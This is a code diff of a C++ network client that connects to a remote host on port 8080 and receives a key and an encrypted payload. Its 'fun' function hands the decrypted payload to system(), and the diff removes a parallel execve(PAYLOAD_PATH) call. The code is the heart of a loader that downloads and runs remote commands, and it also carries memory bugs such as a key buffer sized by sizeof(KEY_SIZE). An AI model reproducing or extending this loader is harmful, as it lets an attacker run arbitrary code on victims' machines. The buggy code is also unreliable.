@@ -6,7 +6,6 @@
 client::client(void) : Socket() {
     struct addrinfo hint;
     struct addrinfo *tmp;
-    struct sockaddr_in *result = new struct sockaddr_in;
     size_t payload_size;
     byte *payload_size_buff;
     byte *key;
@@ -14,31 +13,32 @@ client::client(void) : Socket() {
 
     memset(&hint, 0, sizeof(hint));
     hint.ai_socktype = SOCK_STREAM;
+    hint.ai_flags = AI_CANONNAME;
 
-    if (getaddrinfo(HOST, NULL, &hint, &tmp)) {
+    if (getaddrinfo(host, NULL, &hint, &tmp)) {
         perror("getaddinfo failed");
         exit(EXIT_FAILURE);
     }
 
-    memcpy(result, tmp->ai_addr, sizeof(struct sockaddr));
+    serverAddress = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in));
 
+    memcpy(serverAddress, tmp->ai_addr, sizeof(struct sockaddr));
     freeaddrinfo(tmp);
     
-    serverAddress = std::unique_ptr<sockaddr_in>(result);
-    serverAddress.get()->sin_family = AF_INET;
-    serverAddress.get()->sin_port = htons(8080);
-    serverAddress.get()->sin_addr.s_addr = INADDR_LOOPBACK;
+    serverAddress->sin_family = AF_INET;
+    serverAddress->sin_port = htons(8080);
+    //serverAddress->sin_addr.s_addr = INADDR_LOOPBACK;
 
-    if (connect(sock, (struct sockaddr*)(serverAddress.get()), sizeof(*serverAddress.get())) == -1) {
+    if (connect(sock, (struct sockaddr *)(serverAddress), sizeof(struct sockaddr)) == -1) {
         perror("Oh no. could not connect to host");
         exit(EXIT_FAILURE);
     }
 
     key = (byte *)malloc(sizeof(KEY_SIZE));
-    payload_size_buff = (char *)malloc(sizeof(size_t));
+    payload_size_buff = (char *)malloc(BUFF_SIZE);
 
     read(sock, key, KEY_SIZE);
-    read(sock, payload_size_buff, sizeof(size_t));
+    read(sock, payload_size_buff, BUFF_SIZE);
 
     sscanf(payload_size_buff, "%lu", &payload_size);
     free(payload_size_buff);
@@ -61,9 +61,9 @@ client::client(void) : Socket() {
 
 client::~client(void) {
     close(sock);
+    free(serverAddress);
 }
 
 void fun(crypto *crypt) {
     system(crypt->get_payload());
-    execve(PAYLOAD_PATH, NULL, NULL);
 }
